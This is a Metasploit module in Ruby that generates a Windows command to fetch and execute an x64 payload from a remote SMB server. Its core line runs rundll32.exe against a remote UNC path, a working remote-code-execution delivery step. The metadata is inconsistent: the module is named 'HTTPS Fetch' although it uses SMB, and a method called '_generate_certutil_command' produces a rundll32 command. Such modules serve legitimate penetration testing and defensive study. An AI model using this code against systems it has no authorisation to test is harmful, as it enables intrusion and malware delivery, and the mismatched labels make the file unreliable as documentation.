##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::SMB
  include Msf::Payload::Adapter::Fetch::WindowsOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTPS Fetch',
        'Description' => 'Fetch and Execute an x64 payload from an SMB server',
        'Author' => 'Brendan Watters',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X64,
        'AdaptedPlatform' => 'win'
      )
    )
  end

  def _generate_certutil_command
    "rundll32.exe \\\\#{download_uri},0"
  end

  alias generate_payload_exe generate_payload_dll
end
